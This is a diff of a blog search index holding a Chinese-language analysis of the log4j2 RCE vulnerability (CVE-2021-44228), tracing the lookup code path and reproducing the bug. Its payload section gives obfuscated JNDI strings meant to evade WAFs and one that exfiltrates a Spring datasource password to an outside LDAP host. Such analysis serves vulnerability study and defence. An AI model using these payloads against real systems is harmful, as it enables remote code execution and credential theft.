-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
-
-<h3 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h3><p>跟入<code>org.apache.logging.log4j.core.lookup.StrSubstitutor</code>类的<code>replace</code>方法，里面调用<code>StrSubstitutor</code>类的<code>substitute</code>方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        StringBuilder buf = <span class="keyword">new</span> StringBuilder(source);</span><br><span class="line">        <span class="comment">// 跟入</span></span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">this</span>.substitute(event, buf, <span class="number">0</span>, source.length()) ? source : buf.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">substitute</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="keyword">int</span> offset, <span class="keyword">final</span> <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.substitute(event, buf, offset, length, (List)<span class="keyword">null</span>) &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>接着看看<code>StrSubstitutor</code>类，定义了一些类型为<code>org.apache.logging.log4j.core.lookup.StrMatcher</code>的成员变量，如下</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span> DEFAULT_ESCAPE = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_PREFIX = StrMatcher.stringMatcher(<span class="string">&quot;$&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_SUFFIX = StrMatcher.stringMatcher(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_VALUE_DELIMITER_STRING = <span class="string">&quot;:-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_VALUE_DELIMITER = StrMatcher.stringMatcher(<span class="string">&quot;:-&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ESCAPE_DELIMITER_STRING = <span class="string">&quot;:\\-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_VALUE_ESCAPE_DELIMITER = StrMatcher.stringMatcher(<span class="string">&quot;:\\-&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>可以理解<code>StrMatcher</code>类为<code>log4j</code>内置的字符匹配器，先看下该类的<code>isMath</code>方法，可以看到是指定一个char数组的起始位置和匹配长度去匹配另一个char数组，若完全匹配上则返回匹配上的长度，没匹配上返回<code>0</code>，该方法在接下来的<code>substitute</code>方法中会用到较多，所以这里提一下</p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123190427560.png" class="" title="image-20220123174526935">
-
-<p>接下来看<code>StrSubstitutor</code>类的<code>substitute</code>，该方法就是本次漏洞触发的关键方法</p>
-<p>先while循环去匹配字符串中的前缀字符<code>$&#123;</code></p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123192824964.png" class="" title="image-20220123192824964">
-
-<p>接着将前缀<code>$&#123;</code>后面的字符串通过while循环匹配后缀<code>&#125;</code>，在while循环中匹配后缀之前，会先判断剩下的字符串是否还存在前缀，每匹配一次前缀则<code>nestedVarCount</code>加一，当该变量不为<code>0</code>且匹配中一次后缀<code>&#125;</code>会减一，通过该变量来匹配出最外层<code>$&#123;&#125;</code>包裹的表达式，然后将匹配后的表达式继续往下递归，以满足嵌套的场景</p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123194612458.png" class="" title="image-20220123194612458">
-
-<p>接着判断是否包含<code>:-</code>和<code>:\-</code>分割符，然后做一些分割处理（变形思路1），这里判断较多，就不挨个描述，简单概括为</p>
-<ul>
-<li><code>:-</code> 是一个分割符，如果程序处理到 <code>$&#123;aaaa:-bbbb&#125;</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。</li>
-<li><code>:\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key <code>a</code> 中包含 <code>:</code>，则需要使用转义来配合处理，例如 <code>$&#123;aaa:\\-bbb:-ccc&#125;</code>，代表 key 是，<code>aaa:bbb</code>，value 是 <code>ccc</code>。</li>
-</ul>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123203000204.png" class="" title="image-20220123203000204">
-
-<p>在没有匹配上分隔符或分割处理完后，会调用<code>resolveVariable</code>方法进行解析，将返回的结果替换回原字符串后，再次调用 <code>substitute</code> 方法进行递归解析</p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210610548.png" class="" title="image-20220123210610548">
-
-<h3 id="Lookup"><a href="#Lookup" class="headerlink" title="Lookup"></a>Lookup</h3><p><code>resolveVariable</code>方法会调用<code>resolver</code>解析器的<code>lookup</code>方法，可以看到这里<code>resolver</code>支持12种类型的<code>lookup</code>实现（变形思路2）</p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123204742879.png" class="" title="image-20220123204742879">
-
-<p>接着跟入<code>lookup</code>方法，来到了<code>org.apache.logging.log4j.core.lookup.Interpolator</code>拦截器，该拦截器通过不同前缀分配对应的<code>lookup</code>方法实现</p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210035434.png" class="" title="image-20220123210035434">
-
-<p>继续跟进<code>lookup</code>可以看到，我们传入的是jndi前缀，所以会调用<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>的<code>lookup</code>方法，到这就触发漏洞了。</p>
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210252342.png" class="" title="image-20220123210252342">
-
-<h2 id="0x02-payload变形思路"><a href="#0x02-payload变形思路" class="headerlink" title="0x02 payload变形思路"></a>0x02 payload变形思路</h2><h3 id="增加-干扰"><a href="#增加-干扰" class="headerlink" title="增加:-干扰"></a>增加<code>:-</code>干扰</h3><p>上面说到当字符串种包含<code>:-</code>和<code>:\-</code>会做一些处理，我们就可以该处理逻辑来变形绕过一些waf，例如<code>$&#123;$&#123;p0melo:-j&#125;ndi:ldap://127.0.0.1:1389/kk2err&#125;</code></p>
-<h3 id="嵌套其他协议"><a href="#嵌套其他协议" class="headerlink" title="嵌套其他协议"></a>嵌套其他协议</h3><p>上面分析中可以看到<code>StrLookup</code>除了支持jndi协议还支持其他协议<code>&#123;date, ctx, lower, upper, main, env, sys, sd, java, marker, jndi, jvmrunargs, event, bundle, map, log4j&#125;</code>，所以我们可以通过其他协议变形payload</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;lower:j&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;di:$&#123;lower::::l&#125;dap:<span class="comment">//127.0.0.1:1389/kk2err&#125; // 可以嵌套多个</span></span><br></pre></td></tr></table></figure>
-
-<p>当然我们也可以组合上面两种思路，例如</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;lower:$&#123;p0melo:-j&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;p0melo:-$&#123;lower:J&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123221821111.png" class="" title="image-20220123221821111">
-
-<h3 id="Bundle外带"><a href="#Bundle外带" class="headerlink" title="Bundle外带"></a><strong>Bundle外带</strong></h3><p>方法来自<a class="link"   href="https://b1ue.cn/archives/513.html" >浅蓝师傅博客<i class="fas fa-external-link-alt"></i></a> ，还可以使用Bundle获取特殊变量值并外带，spring环境下可以尝试获取</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//jndi.fuzz.red:5/ku8r/$&#123;bundle:application:spring.datasource.password&#125;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220302220853565.png" class="" title="image-20220302220853565">
-]]></content>
-      <tags>
-        <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>suid提权学习</title>
     <url>/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在p牛博客看到有关suid提权的<a class="link"   href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >文章<i class="fas fa-external-link-alt"></i></a>，所以打算对linux suid提权这块学习记录下，由于是首次接触suid的概念，所以文章前面定义部分记录的比较详细（啰嗦），以便后续学习。</p>
@@ -697,6 +601,102 @@
 ]]></content>
   </entry>
   <entry>
+    <title>log4j2 RCE分析与复现</title>
+    <url>/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>去年12月份爆出了<code>log4j2 RCE</code>的漏洞（<code>CVE-2021-44228</code>），该漏洞利用难度低，危害大，且影响范围广泛，这将有可能是载入安全史册的漏洞，作为史诗级漏洞的见证者，写个漏洞分析留个底还是有必要的😄</p>
+<h2 id="0x00-漏洞复现"><a href="#0x00-漏洞复现" class="headerlink" title="0x00 漏洞复现"></a>0x00 漏洞复现</h2><p>复现比较简单，先引入<code>log4j</code> 版本<code>2.14.1</code>的包，我这里配的是<code>lombok</code>+<code>sprint-boot-starter-log4j2</code>，<code>starter 2.5.7</code>依赖的是<code>2.14.1</code>版本的log4j</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123122258173.png" class="" title="image-20220123122258173">
+
+<p>或者换做直接引<code>log4j</code>的包也是OK的。</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219150315768.png" class="" title="image-20220219150315768">
+
+<p>通过JNDI注入利用<a class="link"   href="https://github.com/welk1n/JNDI-Injection-Exploit" >工具<i class="fas fa-external-link-alt"></i></a>在本地启动JNDI服务，根据项目JDK版本在<code>log.error</code>中插入对应payload即可触发</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123155520880.png" class="" title="image-20220123155520880">
+
+<h2 id="0x01-代码分析"><a href="#0x01-代码分析" class="headerlink" title="0x01 代码分析"></a>0x01 代码分析</h2><h3 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h3><p>跟入error方法，在<code>AbstractLogger</code>类的<code>logIfEnabled</code>方法中进行一层判断，满足了配置的log等级才输出日志</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isEnabled(level, marker, message)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logMessage(fqcn, level, marker, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟到<code>isEnabled</code>方法下面看看是怎么判断，可以看到filter方法中302行会判断传入的level是否大于配置的level，日志输出等级从低到高是<code>All &lt; Trace &lt; Debug &lt; Info &lt; Warn &lt; Error &lt; Fatal &lt; OFF</code>，程序会打印高于或等于所设置级别的日志，而默认配置为<code>error</code>等级，这也就是为什么默认配置下<code>error</code>和<code>fatal</code>可以触发，而<code>debug/info/warn</code>触发不了的原因。</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123163628452.png" class="" title="image-20220123163628452">
+
+<p>我们也可以通过修改log4j2.xml配置来配置日志输出等级</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219145944559.png" class="" title="image-20220219145944559">
+
+<p>接着从<code>logMessage</code>方法往下跟到<code>AbstractOutputStreamAppender</code>类的<code>directEncodeEvent</code>方法，89行跟入<code>encode</code>方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">directEncodeEvent</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 跟入</span></span><br><span class="line">    <span class="keyword">this</span>.getLayout().encode(event, <span class="keyword">this</span>.manager);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.immediateFlush || event.isEndOfBatch()) &#123;</span><br><span class="line">        <span class="keyword">this</span>.manager.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>PatternLayout</code>类实现<code>encode</code>方法，接着关注<code>toText</code>方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">encode</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> ByteBufferDestination destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="keyword">this</span>.eventSerializer <span class="keyword">instanceof</span> Serializer2)) &#123;</span><br><span class="line">        <span class="keyword">super</span>.encode(event, destination);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 跟入toText方法</span></span><br><span class="line">        StringBuilder text = <span class="keyword">this</span>.toText((Serializer2)<span class="keyword">this</span>.eventSerializer, event, getStringBuilder());</span><br><span class="line">        Encoder&lt;StringBuilder&gt; encoder = <span class="keyword">this</span>.getStringBuilderEncoder();</span><br><span class="line">        encoder.encode(text, destination);</span><br><span class="line">        trimToMaxSize(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> StringBuilder <span class="title">toText</span><span class="params">(<span class="keyword">final</span> Serializer2 serializer, <span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serializer.toSerializable(event, destination);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="消息格式化"><a href="#消息格式化" class="headerlink" title="消息格式化"></a>消息格式化</h3><p>跟入<code>toSerializable</code>方法，遍历类型为<code>org.apache.logging.log4j.core.pattern.PatternFormatter</code>类的<code>formatters</code>数组，调用其<code>format</code>方法，这里只需关注第8次循环的<code>format</code>方法，漏洞就是在这个<code>format</code>中触发</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123174526935.png" class="" title="image-20220123174526935">
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.skipFormattingInfo) &#123;</span><br><span class="line">        <span class="comment">// 第8次循环的converter实现为MessagePatternConverter类，跟入</span></span><br><span class="line">        <span class="keyword">this</span>.converter.format(event, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.formatWithInfo(event, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再看看<code>MessagePatternConverter</code>中的<code>format</code>实现，在判断log内容包含<code>$&#123;</code>后，将<code>evet</code>带入的<code>replace</code>方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> </span>&#123;</span><br><span class="line">    Message msg = event.getMessage();</span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">        <span class="keyword">boolean</span> doRender = <span class="keyword">this</span>.textRenderer != <span class="keyword">null</span>;</span><br><span class="line">        StringBuilder workingBuilder = doRender ? <span class="keyword">new</span> StringBuilder(<span class="number">80</span>) : toAppendTo;</span><br><span class="line">        <span class="keyword">int</span> offset = workingBuilder.length();</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable)msg).formatTo(<span class="keyword">this</span>.formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ((StringBuilderFormattable)msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.config != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.noLookups) &#123;  <span class="comment">// 2.14.1及一下版本的noLookups默认为false</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">                <span class="comment">// 判断log内容是否包含&#x27;$&#123;&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    String value = workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line">                    <span class="comment">// 跟入replace方法</span></span><br><span class="line">                    workingBuilder.append(<span class="keyword">this</span>.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>org.apache.logging.log4j.core.util.Constants</code>类中可以看到noLookpus默认为false</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h3><p>跟入<code>org.apache.logging.log4j.core.lookup.StrSubstitutor</code>类的<code>replace</code>方法，里面调用<code>StrSubstitutor</code>类的<code>substitute</code>方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        StringBuilder buf = <span class="keyword">new</span> StringBuilder(source);</span><br><span class="line">        <span class="comment">// 跟入</span></span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">this</span>.substitute(event, buf, <span class="number">0</span>, source.length()) ? source : buf.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">substitute</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="keyword">int</span> offset, <span class="keyword">final</span> <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.substitute(event, buf, offset, length, (List)<span class="keyword">null</span>) &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着看看<code>StrSubstitutor</code>类，定义了一些类型为<code>org.apache.logging.log4j.core.lookup.StrMatcher</code>的成员变量，如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span> DEFAULT_ESCAPE = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_PREFIX = StrMatcher.stringMatcher(<span class="string">&quot;$&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_SUFFIX = StrMatcher.stringMatcher(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_VALUE_DELIMITER_STRING = <span class="string">&quot;:-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_VALUE_DELIMITER = StrMatcher.stringMatcher(<span class="string">&quot;:-&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ESCAPE_DELIMITER_STRING = <span class="string">&quot;:\\-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_VALUE_ESCAPE_DELIMITER = StrMatcher.stringMatcher(<span class="string">&quot;:\\-&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可以理解<code>StrMatcher</code>类为<code>log4j</code>内置的字符匹配器，先看下该类的<code>isMath</code>方法，可以看到是指定一个char数组的起始位置和匹配长度去匹配另一个char数组，若完全匹配上则返回匹配上的长度，没匹配上返回<code>0</code>，该方法在接下来的<code>substitute</code>方法中会用到较多，所以这里提一下</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123190427560.png" class="" title="image-20220123174526935">
+
+<p>接下来看<code>StrSubstitutor</code>类的<code>substitute</code>，该方法就是本次漏洞触发的关键方法</p>
+<p>先while循环去匹配字符串中的前缀字符<code>$&#123;</code></p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123192824964.png" class="" title="image-20220123192824964">
+
+<p>接着将前缀<code>$&#123;</code>后面的字符串通过while循环匹配后缀<code>&#125;</code>，在while循环中匹配后缀之前，会先判断剩下的字符串是否还存在前缀，每匹配一次前缀则<code>nestedVarCount</code>加一，当该变量不为<code>0</code>且匹配中一次后缀<code>&#125;</code>会减一，通过该变量来匹配出最外层<code>$&#123;&#125;</code>包裹的表达式，然后将匹配后的表达式继续往下递归，以满足嵌套的场景</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123194612458.png" class="" title="image-20220123194612458">
+
+<p>接着判断是否包含<code>:-</code>和<code>:\-</code>分割符，然后做一些分割处理（变形思路1），这里判断较多，就不挨个描述，简单概括为</p>
+<ul>
+<li><code>:-</code> 是一个分割符，如果程序处理到 <code>$&#123;aaaa:-bbbb&#125;</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。</li>
+<li><code>:\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key <code>a</code> 中包含 <code>:</code>，则需要使用转义来配合处理，例如 <code>$&#123;aaa:\\-bbb:-ccc&#125;</code>，代表 key 是，<code>aaa:bbb</code>，value 是 <code>ccc</code>。</li>
+</ul>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123203000204.png" class="" title="image-20220123203000204">
+
+<p>在没有匹配上分隔符或分割处理完后，会调用<code>resolveVariable</code>方法进行解析，将返回的结果替换回原字符串后，再次调用 <code>substitute</code> 方法进行递归解析</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210610548.png" class="" title="image-20220123210610548">
+
+<h3 id="Lookup"><a href="#Lookup" class="headerlink" title="Lookup"></a>Lookup</h3><p><code>resolveVariable</code>方法会调用<code>resolver</code>解析器的<code>lookup</code>方法，可以看到这里<code>resolver</code>支持12种类型的<code>lookup</code>实现（变形思路2）</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123204742879.png" class="" title="image-20220123204742879">
+
+<p>接着跟入<code>lookup</code>方法，来到了<code>org.apache.logging.log4j.core.lookup.Interpolator</code>拦截器，该拦截器通过不同前缀分配对应的<code>lookup</code>方法实现</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210035434.png" class="" title="image-20220123210035434">
+
+<p>继续跟进<code>lookup</code>可以看到，我们传入的是jndi前缀，所以会调用<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>的<code>lookup</code>方法，到这就触发漏洞了。</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210252342.png" class="" title="image-20220123210252342">
+
+<h2 id="0x02-payload变形思路"><a href="#0x02-payload变形思路" class="headerlink" title="0x02 payload变形思路"></a>0x02 payload变形思路</h2><h3 id="增加-干扰"><a href="#增加-干扰" class="headerlink" title="增加:-干扰"></a>增加<code>:-</code>干扰</h3><p>上面说到当字符串种包含<code>:-</code>和<code>:\-</code>会做一些处理，我们就可以该处理逻辑来变形绕过一些waf，例如<code>$&#123;$&#123;p0melo:-j&#125;ndi:ldap://127.0.0.1:1389/kk2err&#125;</code></p>
+<h3 id="嵌套其他协议"><a href="#嵌套其他协议" class="headerlink" title="嵌套其他协议"></a>嵌套其他协议</h3><p>上面分析中可以看到<code>StrLookup</code>除了支持jndi协议还支持其他协议<code>&#123;date, ctx, lower, upper, main, env, sys, sd, java, marker, jndi, jvmrunargs, event, bundle, map, log4j&#125;</code>，所以我们可以通过其他协议变形payload</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;lower:j&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;di:$&#123;lower::::l&#125;dap:<span class="comment">//127.0.0.1:1389/kk2err&#125; // 可以嵌套多个</span></span><br></pre></td></tr></table></figure>
+
+<p>当然我们也可以组合上面两种思路，例如</p>
